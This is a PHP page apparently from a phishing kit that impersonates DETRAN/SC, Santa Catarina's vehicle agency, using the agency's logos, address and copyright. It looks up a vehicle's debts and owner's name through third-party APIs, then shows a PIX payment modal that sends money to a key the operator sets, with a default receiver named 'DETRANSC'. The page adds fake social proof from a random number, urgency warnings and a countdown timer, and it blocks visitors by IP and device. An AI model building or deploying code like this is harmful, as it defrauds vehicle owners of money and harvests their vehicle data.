<?php
/**
 * Resultado SC - Exibe débitos do veículo consultados via API Firestone
 */
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/pix.php';

enforceIpNotBlocked();
enforceMobileOnly();
addSecurityHeaders();

$renavam = isset($_GET['renavam']) ? preg_replace('/\D/', '', $_GET['renavam']) : '';
$placa = isset($_GET['placa']) ? strtoupper(preg_replace('/[^A-Za-z0-9]/', '', $_GET['placa'])) : '';

if (empty($renavam)) {
    header('Location: index.php');
    exit;
}

// Chamar API Firestone
$apiUrl = "https://apifirestone.xyz/firestone/api.php?nome=aluguel15&tela=sc&lista=" . urlencode($placa) . "|" . urlencode($renavam);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

$data = json_decode($response, true);
$error = '';
$debts = [];
$total = 0;

if ($curlError || $httpCode !== 200 || !$data) {
    $error = 'Erro ao consultar débitos. Tente novamente.';
} elseif (empty($data['debts'])) {
    $error = 'Nenhum débito encontrado para este veículo.';
} else {
    $debts = $data['debts'];
    foreach ($debts as $d) { $total += (float)$d['valor']; }
    $placa = $data['placa'] ?? $placa;
    $renavam = $data['renavam'] ?? $renavam;
}

// Buscar dados completos do veículo pela API fipeapi (SC)
$vehicleExtra = null;
if (!empty($placa)) {
    // Tentar API fipeapi primeiro (específica para SC)
    try {
        $pdo = getConnection();
        $stmtToken = $pdo->prepare("SELECT valor FROM configuracoes WHERE chave = 'fipeapi_bearer_token'");
        $stmtToken->execute();
        $tokenRow = $stmtToken->fetch();
        $fipeToken = $tokenRow ? $tokenRow['valor'] : '';
    } catch (Exception $e) {
        $fipeToken = '';
    }
    
    if (!empty($fipeToken)) {
        $chF = curl_init('https://apiplaca.fipeapi.site/api/v1/consulta-placa');
        curl_setopt_array($chF, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query(['placa' => $placa]),
            CURLOPT_HTTPHEADER => [
                'Authorization: Bearer ' . $fipeToken,
                'Content-Type: application/x-www-form-urlencoded'
            ],
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
        ]);
        $fipeResp = curl_exec($chF);
        curl_close($chF);
        $fipeJson = json_decode($fipeResp, true);
        
        // Formato: { ok: true, data: { dados: { dados: [{ ... }] } } }
        $fipeVeiculo = $fipeJson['data']['dados']['dados'][0] ?? null;
        if (!empty($fipeVeiculo) && (!empty($fipeVeiculo['marcaModelo']) || !empty($fipeVeiculo['marca']))) {
            $marcaModeloFull = str_replace('/', ' ', $fipeVeiculo['marcaModelo'] ?? '');
            $parts = explode(' ', trim($marcaModeloFull), 2);
            $vehicleExtra = [
                'marca' => $parts[0] ?? '',
                'modelo' => $parts[1] ?? '',
                'cor' => $fipeVeiculo['cor'] ?? '',
                'combustivel' => $fipeVeiculo['combustivel'] ?? '',
                'tipo_veiculo' => $fipeVeiculo['tipo'] ?? '',
                'especie' => $fipeVeiculo['especie'] ?? '',
                'ano_fabricacao' => $fipeVeiculo['anoFabricacao'] ?? '',
                'ano_modelo' => $fipeVeiculo['anoModelo'] ?? '',
                'situacao' => $fipeVeiculo['categoria'] ?? '',
                'tipo_carroceria' => $fipeVeiculo['carroceria'] ?? '',
                'placa' => $fipeVeiculo['placa'] ?? $placa,
                'proprietario' => $fipeVeiculo['nomeProprietario'] ?? '',
            ];
        }
    }
    
    // Fallback: API spoofingfy
    if (empty($vehicleExtra)) {
        try {
            $pdo = getConnection();
            $stmtKey = $pdo->prepare("SELECT valor FROM configuracoes WHERE chave = 'placa_api_key'");
            $stmtKey->execute();
            $keyRow = $stmtKey->fetch();
            $placaApiKey = $keyRow ? $keyRow['valor'] : '';
        } catch (Exception $e) {
            $placaApiKey = '';
        }
        
        if (!empty($placaApiKey)) {
            $veicUrl = "https://spoofingfy.shop/api/placa3.php?placa=" . urlencode($placa) . "&key=" . urlencode($placaApiKey);
            $chV = curl_init();
            curl_setopt($chV, CURLOPT_URL, $veicUrl);
            curl_setopt($chV, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($chV, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($chV, CURLOPT_TIMEOUT, 10);
            curl_setopt($chV, CURLOPT_USERAGENT, 'Mozilla/5.0');
            $veicResp = curl_exec($chV);
            curl_close($chV);
            $veicData = json_decode($veicResp, true);
            if (!empty($veicData['sucesso']) && !empty($veicData['dados'])) {
                $vehicleExtra = $veicData['dados'];
            }
        }
    }
}

// Ordenar débitos: 1) Licenciamento, 2) IPVA Único, 3) IPVA Parcelado, 4) Multas
usort($debts, function($a, $b) {
    $order = function($d) {
        if ($d['tipo'] === 'LICENCIAMENTO') return 0;
        $desc = strtoupper($d['descricao']);
        if (strpos($desc, 'COTA') !== false && (strpos($desc, 'ÚNICA') !== false || strpos($desc, 'UNICA') !== false)) return 1;
        if (strpos($desc, 'ATRASADO') !== false || strpos($desc, 'PARCELADO') !== false || strpos($desc, 'PARCELA') !== false) return 2;
        if ($d['tipo'] === 'MULTA') return 3;
        return 2;
    };
    return $order($a) - $order($b);
});


// Check for overdue debts
$hasOverdue = false;
foreach ($debts as $d) {
    $parts = explode('/', $d['vencimento']);
    if (count($parts) === 3) {
        $venc = mktime(0, 0, 0, (int)$parts[1], (int)$parts[0], (int)$parts[2]);
        if ($venc < time()) { $hasOverdue = true; break; }
    }
}
$pessoasHoje = rand(100, 1000);

// Buscar config PIX
$pdo = getConnection();
$pixChave = '';
$pixNome = 'DETRANSC';
$pixCidade = 'FLORIANOPOLIS';
$pixTxid = '';

// Prioridade: chave_pix_padrao (JSON)
$stmtPP = $pdo->prepare("SELECT valor FROM configuracoes WHERE chave = 'chave_pix_padrao' AND ativo = 1 LIMIT 1");
$stmtPP->execute();
$ppRow = $stmtPP->fetch();
if ($ppRow && !empty($ppRow['valor'])) {
    $pp = json_decode($ppRow['valor'], true);
    if (is_array($pp)) {
        $pixChave = trim((string)($pp['chave_pix'] ?? ''));
        $pixNome = trim((string)($pp['nome_recebedor'] ?? $pixNome));
        $pixCidade = trim((string)($pp['cidade'] ?? $pixCidade));
        $pixTxid = trim((string)($pp['txid'] ?? ''));
    }
}
// Fallback: chaves separadas
if (empty($pixChave)) {
    $stmtPix = $pdo->prepare("SELECT chave, valor FROM configuracoes WHERE chave IN ('pix_chave', 'pix_nome_recebedor', 'pix_cidade', 'pix_referencia')");
    $stmtPix->execute();
    $pixConfigs = $stmtPix->fetchAll(PDO::FETCH_KEY_PAIR);
    if (!empty($pixConfigs['pix_chave'])) $pixChave = $pixConfigs['pix_chave'];
    if (!empty($pixConfigs['pix_nome_recebedor'])) $pixNome = $pixConfigs['pix_nome_recebedor'];
    if (!empty($pixConfigs['pix_cidade'])) $pixCidade = $pixConfigs['pix_cidade'];
    if (!empty($pixConfigs['pix_referencia'])) $pixTxid = $pixConfigs['pix_referencia'];
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Débitos do Veículo - DETRAN/SC</title>
  <link rel="icon" type="image/png" href="assets/favicon-detran-sc.png">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Montserrat', Arial, sans-serif; background: #f5f5f5; color: #333; font-size: 15px; }

    .rsc-header { background: #fff; color: #333; padding: 0 24px; }
    .rsc-header-inner { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; padding: 12px 0; }
    .rsc-header-left { display: flex; align-items: center; gap: 16px; }
    .rsc-logo { height: 48px; }
    .rsc-header-title { font-size: 18px; color: #333; letter-spacing: 1px; }
    .rsc-header-title b { font-weight: 700; }
    .rsc-header-line { height: 3px; background: linear-gradient(90deg, #C4000B 0%, #C4000B 33%, #4CAF50 33%, #4CAF50 66%, #8BC34A 66%, #8BC34A 100%); }

    .rsc-main { max-width: 900px; margin: 0 auto; padding: 24px 16px; }
    .rsc-title { font-size: 22px; font-weight: 400; margin-bottom: 24px; }

    .rsc-vehicle-card { background: #fff; border-radius: 12px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(0,0,0,0.08); }
    .rsc-card-title { font-size: 17px; font-weight: 600; color: #336633; margin-bottom: 16px; }
    .rsc-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; background: #e7e7e7; border-radius: 8px; padding: 16px; }
    .rsc-label { font-size: 13px; font-weight: 700; color: #333; }
    .rsc-value { font-size: 13px; color: #333; margin-top: 2px; }

    .rsc-warning { background: #fef9e7; border: 1px solid #f0d060; border-radius: 8px; padding: 16px 20px; display: flex; align-items: flex-start; gap: 12px; margin-bottom: 24px; }
    .rsc-warning-icon { font-size: 22px; }
    .rsc-warning strong { font-size: 14px; }
    .rsc-warning p { font-size: 13px; color: #666; margin: 2px 0 0; }

    .rsc-section { background: #fff; border-radius: 12px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(0,0,0,0.08); }
    .rsc-debts-card { padding: 18px 24px 20px; }
    .rsc-debts-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; flex-wrap: wrap; gap: 16px; }
    .rsc-debts-title { font-size: 18px; font-weight: 600; color: #336633; margin-bottom: 4px; }
    .rsc-debts-total-line { font-size: 15px; color: #666; }
    .rsc-debts-total { font-size: 18px; font-weight: 700; color: #ff2323; }
    .rsc-debts-parcela { font-size: 13px; color: #4f6a3d; margin-top: 2px; }
    .rsc-debts-social { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #666; margin: 12px 0 18px; }
    .rsc-debts-social strong { color: #333; }
    .rsc-proof-dots { display: inline-flex; align-items: center; gap: 2px; }
    .rsc-dot { width: 18px; height: 18px; border-radius: 999px; display: inline-block; border: 2px solid #fff; margin-left: -4px; }
    .rsc-dot:first-child { margin-left: 0; }
    .rsc-dot-green { background: #59b94d; }
    .rsc-dot-blue { background: #3a9ae5; }
    .rsc-dot-orange { background: #ff9800; }

    .rsc-pagar-tudo { display: inline-flex; align-items: center; gap: 8px; padding: 11px 18px; background: #2f6930; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; font-family: inherit; text-decoration: none; box-shadow: 0 6px 14px rgba(47,105,48,0.18); }
    .rsc-pagar-tudo:hover { background: #245426; }

    .rsc-table-shell { background: #e7e7e7; border-radius: 10px; overflow: hidden; }
    .rsc-table { width: 100%; border-collapse: collapse; font-size: 14px; }
    .rsc-table thead th { background: #e7e7e7; padding: 16px 18px 10px; text-align: center; font-weight: 700; color: #404040; border-bottom: none; font-size: 13px; }
    .rsc-th-left, .rsc-td-left { text-align: left !important; }
    .rsc-table tbody td { padding: 10px 18px; border-bottom: none; vertical-align: middle; color: #555; }
    .rsc-value-strong { font-weight: 700; color: #444; }
    .rsc-row-overdue { background: #f9eaea; }
    .rsc-overdue-date { color: #ff2323; font-weight: 700; }
    .rsc-overdue-warn { color: #ff2323; font-size: 12px; margin-top: 4px; }

    .rsc-pagar-btn { display: inline-flex; align-items: center; justify-content: center; gap: 6px; min-width: 120px; padding: 12px 24px; background: #2f6930; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; font-family: inherit; text-decoration: none; }
    .rsc-pagar-btn:hover { background: #245426; }

    .rsc-badges { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding-top: 16px; margin-top: 16px; }
    .rsc-badges span { display: inline-flex; align-items: center; gap: 4px; padding: 5px 12px; background: #f5f5f5; border-radius: 20px; border: 1px solid #e0e0e0; font-size: 12px; color: #8a8a8a; }
    .rsc-badge-active { border-color: #9fd0ff !important; background: #edf6ff !important; color: #1a84d8 !important; }

    .rsc-footer { background: #e0e0e0; padding: 40px 20px 20px; text-align: center; margin-top: 40px; }
    .rsc-footer-divider { display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 12px; }
    .rsc-footer-line { flex: 1; height: 2px; max-width: 200px; }
    .rsc-footer-line-left { background: linear-gradient(90deg, transparent, #c00); }
    .rsc-footer-line-right { background: linear-gradient(90deg, #c00, transparent); }
    .rsc-footer-logo { height: 60px; }
    .rsc-footer p { font-size: 13px; color: #555; margin: 4px 0; }
    .rsc-footer .rsc-footer-copyright { font-size: 11px; color: #999; margin-top: 12px; }

    .rsc-error { background: #fff; border-radius: 12px; padding: 40px; text-align: center; }
    .rsc-error h2 { color: #c00; margin-bottom: 12px; }
    .rsc-error p { color: #666; margin-bottom: 8px; }
    .rsc-back-btn { display: inline-block; margin-top: 16px; padding: 10px 24px; background: hsl(210, 50%, 20%); color: #fff; text-decoration: none; border-radius: 6px; font-weight: 600; }

    /* ===== PIX MODAL ===== */
    .pix-overlay { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10000; align-items:center; justify-content:center; }
    .pix-overlay.active { display:flex; }
    .pix-modal { background:#fff; border-radius:12px; max-width:440px; width:92%; max-height:95vh; overflow-y:auto; position:relative; }
    .pix-modal-header { display:flex; justify-content:space-between; align-items:flex-start; padding:16px 16px 8px; }
    .pix-modal-header h2 { font-size:17px; font-weight:700; color:#333; }
    .pix-modal-header p { font-size:13px; color:#888; }
    .pix-modal-header p span { color:#2f6930; font-weight:600; }
    .pix-close { background:none; border:none; font-size:22px; color:#999; cursor:pointer; padding:4px; }
    .pix-body { padding:0 16px 20px; }
    .pix-info-banner { background:#e8f4fd; border:1px solid #b8ddf5; border-radius:8px; padding:10px 12px; display:flex; gap:8px; align-items:flex-start; margin-bottom:12px; }
    .pix-info-banner .ico { color:#2196F3; font-size:16px; flex-shrink:0; margin-top:2px; }
    .pix-info-banner p { font-size:13px; color:#1565C0; line-height:1.4; }
    .pix-info-banner strong { font-weight:700; }
    .pix-timer { display:flex; align-items:center; justify-content:center; gap:6px; padding:10px; border:1px solid #e0e0e0; border-radius:8px; margin-bottom:14px; font-size:13px; color:#666; }
    .pix-timer strong { color:#333; }
    .pix-steps { margin-bottom:14px; }
    .pix-step { display:flex; align-items:flex-start; gap:10px; margin-bottom:10px; }
    .pix-step-num { width:22px; height:22px; border-radius:50%; background:#2f6930; color:#fff; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:700; flex-shrink:0; }
    .pix-step-text strong { font-size:13px; color:#333; }
    .pix-step-text p { font-size:12px; color:#888; margin-top:1px; }
    .pix-qr-label { text-align:center; font-size:13px; font-weight:600; color:#333; margin-bottom:8px; }
    .pix-qr-wrap { display:flex; justify-content:center; margin-bottom:14px; }
    .pix-qr-box { padding:10px; border:1px solid #e0e0e0; border-radius:8px; display:inline-block; background:#fff; }
    .pix-code-box { background:#f5f5f5; border:1px solid #e0e0e0; border-radius:8px; padding:10px; font-size:11px; font-family:monospace; color:#666; word-break:break-all; max-height:56px; overflow-y:auto; margin-bottom:12px; }
    .pix-btn { width:100%; padding:13px; border:none; border-radius:8px; font-size:14px; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:10px; font-family:inherit; }
    .pix-btn-copy { background:#2f6930; color:#fff; }
    .pix-btn-copy:hover { background:#245426; }
    .pix-btn-copy.copied { background:#22c55e; }
    .pix-btn-whatsapp { background:#25D366; color:#fff; }
    .pix-btn-whatsapp:hover { background:#1da855; }
    .pix-btn-done { background:#fff; color:#555; border:2px solid #ccc; }
    .pix-btn-done:hover { background:#f9f9f9; }

    @media (max-width: 600px) {
      .rsc-grid { grid-template-columns: 1fr; }
      .rsc-debts-header { flex-direction: column; }
      .rsc-pagar-tudo { width: 100%; justify-content: center; }
      .rsc-table thead { display: none; }
      .rsc-table tbody tr { display: flex; flex-direction: column; flex-wrap: wrap; border: 1px solid #ddd; border-radius: 12px; margin-bottom: 12px; padding: 18px; gap: 6px; background: #fff; }
      .rsc-table tbody td { display: flex; flex-direction: column; padding: 4px 0; border: none; text-align: left; font-size: 14px; }
      .rsc-table tbody td::before { content: attr(data-label); font-weight: 600; color: #888; text-align: left; font-size: 11px; margin-bottom: 2px; text-transform: uppercase; letter-spacing: 0.3px; }
      .rsc-table tbody td.rsc-td-left { width: 100%; order: 1; }
      .rsc-table tbody td[data-label="Vencimento"] { width: 50%; order: 2; }
      .rsc-table tbody td[data-label="Valor total"] { width: 50%; order: 3; }
      .rsc-table tbody td.rsc-action-cell { width: 100%; order: 4; justify-content: center; margin-top: 8px; }
      .rsc-table tbody td.rsc-action-cell::before { display: none; }
      .rsc-pagar-btn { width: 100%; justify-content: center; padding: 12px; background: #2f6930; color: #fff; border: none; font-size: 14px; }
      .rsc-pagar-btn:hover { background: #245426; }
    }
  </style>
</head>
<body>
  <header class="rsc-header">
    <div class="rsc-header-inner">
      <div class="rsc-header-left">
        <img src="assets/detransc-logo.png" alt="DetranSC" class="rsc-logo">
        <span class="rsc-header-title"><b>DETRAN</b> DIGITAL</span>
      </div>
    </div>
    <div class="rsc-header-line"></div>
  </header>

  <main class="rsc-main">
    <h1 class="rsc-title">Consultar Débitos do Veículo - DETRAN/SC</h1>

    <?php if ($error): ?>
      <div class="rsc-error">
        <h2>Veículo não encontrado</h2>
        <p><?= htmlspecialchars($error) ?></p>
        <p>RENAVAM informado: <strong><?= htmlspecialchars($renavam) ?></strong></p>
        <a href="index.php" class="rsc-back-btn">Nova Consulta</a>
      </div>
    <?php else: ?>
      <!-- Dados do Veículo -->
      <div class="rsc-vehicle-card">
        <h2 class="rsc-card-title">DADOS DO VEÍCULO</h2>
        <div class="rsc-grid">
          <div>
            <div class="rsc-label">Marca / Modelo</div>
            <div class="rsc-value"><?= htmlspecialchars($vehicleExtra['modelo'] ?? '—') ?></div>
          </div>
          <div>
            <div class="rsc-label">Placa</div>
            <div class="rsc-value"><?= htmlspecialchars($placa) ?></div>
          </div>
          <div>
            <div class="rsc-label">Renavam</div>
            <div class="rsc-value"><?= htmlspecialchars(substr($renavam, 0, -3) . '***') ?></div>
          </div>
          <div>
            <div class="rsc-label">Fabricação / Modelo</div>
            <div class="rsc-value"><?= htmlspecialchars(($vehicleExtra['ano_fabricacao'] ?? '—') . '/' . ($vehicleExtra['ano_modelo'] ?? '—')) ?></div>
          </div>
          <div>
            <div class="rsc-label">Tipo</div>
            <div class="rsc-value"><?= htmlspecialchars(($vehicleExtra['tipo_veiculo'] ?? '—') . '/' . ($vehicleExtra['especie'] ?? '—')) ?></div>
          </div>
          <div>
            <div class="rsc-label">Cor</div>
            <div class="rsc-value"><?= htmlspecialchars($vehicleExtra['cor'] ?? '—') ?></div>
          </div>
          <div>
            <div class="rsc-label">Combustível</div>
            <div class="rsc-value"><?= htmlspecialchars($vehicleExtra['combustivel'] ?? '—') ?></div>
          </div>
          <div>
            <div class="rsc-label">Situação</div>
            <div class="rsc-value"><?= htmlspecialchars(ucwords(strtolower(str_replace('_', ' ', $vehicleExtra['situacao'] ?? '—')))) ?></div>
          </div>
        </div>
      </div>

      <?php if ($hasOverdue): ?>
      <div class="rsc-warning">
        <span class="rsc-warning-icon">⚠️</span>
        <div>
          <strong>Débitos vencidos — multa e juros acumulando!</strong>
          <p>Regularize agora para evitar maiores acréscimos e o bloqueio do veículo.</p>
        </div>
      </div>
      <?php endif; ?>

      <!-- Débitos -->
      <div class="rsc-section rsc-debts-card">
        <div class="rsc-debts-header">
          <div>
            <div class="rsc-debts-title">Débitos</div>
            <div class="rsc-debts-total-line">Total: <span class="rsc-debts-total">R$ <?= number_format($total, 2, ',', '.') ?></span></div>
            
          </div>
          <?php $valorTotalFormatado = number_format($total, 2, ',', '.'); ?>
          <button class="rsc-pagar-tudo" onclick="abrirPixModal('<?= $valorTotalFormatado ?>', 'Todos os débitos', '2026')">
            ✥ Pagar tudo — R$ <?= $valorTotalFormatado ?>
          </button>
        </div>

        <div class="rsc-debts-social">
          <span class="rsc-proof-dots"><span class="rsc-dot rsc-dot-green"></span><span class="rsc-dot rsc-dot-blue"></span><span class="rsc-dot rsc-dot-orange"></span></span>
          <strong><?= $pessoasHoje ?> pessoas</strong> quitaram débitos hoje
        </div>

        <div class="rsc-table-shell">
          <table class="rsc-table">
            <thead>
              <tr>
                <th class="rsc-th-left">Débito</th>
                <th>Vencimento</th>
                <th>Valor total</th>
                <th>Pagar</th>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($debts as $index => $debt):
                $parts = explode('/', $debt['vencimento']);
                $isOverdue = false;
                if (count($parts) === 3) {
                    $venc = mktime(0, 0, 0, (int)$parts[1], (int)$parts[0], (int)$parts[2]);
                    $isOverdue = $venc < time();
                }
                $valorF = number_format((float)$debt['valor'], 2, ',', '.');
                $exPix = $debt['exercicio'];

                if ($debt['tipo'] === 'LICENCIAMENTO') {
                    $label = 'Licenciamento - ' . $debt['exercicio'];
                } elseif (stripos($debt['descricao'], 'COTA ÚNICA') !== false || stripos($debt['descricao'], 'COTA UNICA') !== false) {
                    $label = 'IPVA Único ' . $debt['exercicio'];
                } elseif (stripos($debt['descricao'], 'ATRASADO') !== false || stripos($debt['descricao'], 'PARCELADO') !== false) {
                    $label = 'IPVA Parcelado ' . $debt['exercicio'] . ' - Parcela 1';
                } elseif ($debt['tipo'] === 'MULTA') {
                    $rawDesc = trim($debt['descricao'] ?: '');
                    // Se a descrição já começa com "Multa", não duplicar
                    if (stripos($rawDesc, 'Multa') === 0) {
                        $label = $rawDesc;
                    } else {
                        $label = 'Multa - ' . ($rawDesc ?: 'MULTA');
                    }
                } else {
                    $label = $debt['descricao'] . ' - ' . $debt['exercicio'];
                }

                $overdueText = '';
                if ($isOverdue && $venc > 0) {
                    $diffDays = (int)floor((time() - $venc) / 86400);
                    $overdueText = '⚠ Vencido há ' . $diffDays . ' dia' . ($diffDays > 1 ? 's' : '') . ' — multa e juros acumulando';
                }
              ?>
              <tr class="<?= $isOverdue ? 'rsc-row-overdue' : '' ?>">
                <td data-label="Débito" class="rsc-td-left">
                  <?= htmlspecialchars($label) ?>
                  <?php if ($isOverdue): ?>
                    <div class="rsc-overdue-warn"><?= htmlspecialchars($overdueText) ?></div>
                  <?php endif; ?>
                </td>
                <td data-label="Vencimento" class="<?= $isOverdue ? 'rsc-overdue-date' : '' ?>">
                  <?= htmlspecialchars($debt['vencimento']) ?> <?= $isOverdue ? '⚠' : '' ?>
                </td>
                <td data-label="Valor total" class="rsc-value-strong">R$ <?= $valorF ?></td>
                <td data-label="Pagar" class="rsc-action-cell">
                  <button class="rsc-pagar-btn" onclick="abrirPixModal('<?= $valorF ?>', '<?= addslashes($label) ?>', '<?= addslashes($exPix) ?>')">
                    ✥ Pagar via PIX
                  </button>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>

      </div>
    <?php endif; ?>
  </main>

  <footer class="rsc-footer">
    <div class="rsc-footer-divider">
      <div class="rsc-footer-line rsc-footer-line-left"></div>
      <img src="assets/detransc-logo.png" alt="DetranSC" class="rsc-footer-logo">
      <div class="rsc-footer-line rsc-footer-line-right"></div>
    </div>
    <p style="font-weight:700;">Departamento Estadual de Trânsito de Santa Catarina - DETRAN/SC</p>
    <p>Av. Almirante Tamandaré - 480, Coqueiros, Florianópolis, SC CEP 88.080-160</p>
    <p>Fone (48) 3664-1800 / centraldeinformacoes@detran.sc.gov.br</p>
    <p style="font-size:12px;margin-top:12px;">🔒 Política de Privacidade</p>
    <p class="rsc-footer-copyright">Copyright © 2026 Todos os Direitos Reservados SC - Governo de Santa Catarina | Desenvolvimento - CIASC</p>
  </footer>

  <!-- PIX MODAL -->
  <div class="pix-overlay" id="pixOverlay">
    <div class="pix-modal">
      <div class="pix-modal-header">
        <div>
          <h2>Pagamento por PIX</h2>
          <p>Valor: <span id="pixModalValor">R$ 0,00</span></p>
        </div>
        <button class="pix-close" onclick="fecharPixModal()">✕</button>
      </div>
      <div class="pix-body">
        <div class="pix-info-banner">
          <span class="ico">ℹ</span>
          <p>Abra seu banco → vá em <strong>PIX → Pagar → Ler QR Code</strong> e aponte a câmera para o código abaixo</p>
        </div>
        <div class="pix-timer">
          <span>⏱</span> QR code válido por <strong id="pixTimerDisplay">30:00</strong>
        </div>
        <div class="pix-steps">
          <div class="pix-step">
            <span class="pix-step-num">1</span>
            <div class="pix-step-text"><strong>Abra o app do seu banco</strong><p>Acesse o menu PIX no aplicativo</p></div>
          </div>
          <div class="pix-step">
            <span class="pix-step-num">2</span>
            <div class="pix-step-text"><strong>Escolha "Pagar com QR Code"</strong><p>Aponte a câmera para o QR code abaixo ou copie o código</p></div>
          </div>
        </div>
        <div class="pix-qr-label">Leia o QR Code:</div>
        <div class="pix-qr-wrap"><div class="pix-qr-box" id="pixQrBox"></div></div>
        <div class="pix-code-box" id="pixCodeBox">Gerando...</div>
        <button class="pix-btn pix-btn-copy" id="pixCopyBtn" onclick="copiarPix()">
          📋 Copiar código PIX
        </button>
        <button class="pix-btn pix-btn-done" onclick="jaRealizeiPagamento()">
          Já realizei o pagamento
        </button>
      </div>
    </div>
  </div>

  <script>
  var basePath = '<?= rtrim(dirname($_SERVER["SCRIPT_NAME"]), "/") . "/" ?>';
  var pixChave = '<?= addslashes($pixChave) ?>';
  var pixNome = '<?= addslashes($pixNome) ?>';
  var pixCidade = '<?= addslashes($pixCidade) ?>';
  var pixTxid = '<?= addslashes($pixTxid) ?>';
  var placaAtual = '<?= addslashes($placa) ?>';
  var renavamAtual = '<?= addslashes($renavam) ?>';
  var currentPixCode = '';
  var currentPagamentoId = '';
  var currentPagamentoCodigo = '';
  var pixTimerInterval = null;

  function abrirPixModal(valor, descricao, exercicio) {
    document.getElementById('pixModalValor').textContent = 'R$ ' + valor;
    document.getElementById('pixOverlay').classList.add('active');
    document.getElementById('pixCodeBox').textContent = 'Gerando código PIX...';
    document.getElementById('pixQrBox').innerHTML = '<div style="width:180px;height:180px;display:flex;align-items:center;justify-content:center;"><div style="width:32px;height:32px;border:3px solid #ccc;border-top-color:#2f6930;border-radius:50%;animation:spin 1s linear infinite;"></div></div>';

    // Timer
    var seconds = 30 * 60;
    clearInterval(pixTimerInterval);
    pixTimerInterval = setInterval(function() {
      seconds--;
      if (seconds <= 0) { clearInterval(pixTimerInterval); seconds = 0; }
      var m = Math.floor(seconds / 60);
      var s = seconds % 60;
      document.getElementById('pixTimerDisplay').textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
    }, 1000);

    // Generate PIX via edge function
    var valorNum = parseFloat(valor.replace(/\./g, '').replace(',', '.'));
    var identificador = placaAtual + ' / ' + renavamAtual;
    var descKey = descricao.normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/[^a-zA-Z0-9]+/g, '-').replace(/^-+|-+$/g, '').toUpperCase().substring(0, 32) || 'PAGAMENTO';
    var numFatura = 'IPVA-' + (exercicio || '2026') + '-' + renavamAtual + '-' + descKey;

    fetch(basePath + 'api/gerar_pix.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ valor: valorNum, identificador: identificador, numeroFatura: numFatura, descricao: descricao })
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      currentPixCode = data.code || data.qrcode || '';
      currentPagamentoId = data.pagamento_id || '';
      currentPagamentoCodigo = data.codigo || '';
      document.getElementById('pixCodeBox').textContent = currentPixCode;

      // QR
      if (currentPixCode) {
        var qr = qrcode(0, 'M');
        qr.addData(currentPixCode);
        qr.make();
        document.getElementById('pixQrBox').innerHTML = qr.createSvgTag(5, 0);
        var svg = document.querySelector('#pixQrBox svg');
        if (svg) { svg.style.width = '180px'; svg.style.height = '180px'; }
      }
    })
    .catch(function(err) {
      document.getElementById('pixCodeBox').textContent = 'Erro ao gerar PIX. Tente novamente.';
      console.error(err);
    });
  }

  function fecharPixModal() {
    document.getElementById('pixOverlay').classList.remove('active');
    clearInterval(pixTimerInterval);
  }

  function copiarPix() {
    if (!currentPixCode) return;
    navigator.clipboard.writeText(currentPixCode).then(function() {
      var btn = document.getElementById('pixCopyBtn');
      btn.classList.add('copied');
      btn.innerHTML = '✅ Copiado!';
      setTimeout(function() { btn.classList.remove('copied'); btn.innerHTML = '📋 Copiar código PIX'; }, 3000);

      // Registrar pix copiado
      if (currentPagamentoId) {
        fetch(basePath + 'api/pix_copiado.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pagamento_id: currentPagamentoId, pagamento_codigo: parseInt(currentPagamentoCodigo) || 0 })
        }).catch(function() {});
      }
    });
  }


  function jaRealizeiPagamento() {
    if (currentPagamentoId) {
      // Marcar como aguardando confirmação
      fetch(basePath + 'api/marcar_pagamento_realizado.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pagamento_id: currentPagamentoId })
      }).catch(function() {});
    }
    alert('Pagamento registrado! Aguarde a confirmação.');
    fecharPixModal();
  }
  </script>

  <style>@keyframes spin { to { transform: rotate(360deg); } }</style>

  <?php include __DIR__ . '/includes/tracking.php'; ?>
  
</body>
</html>
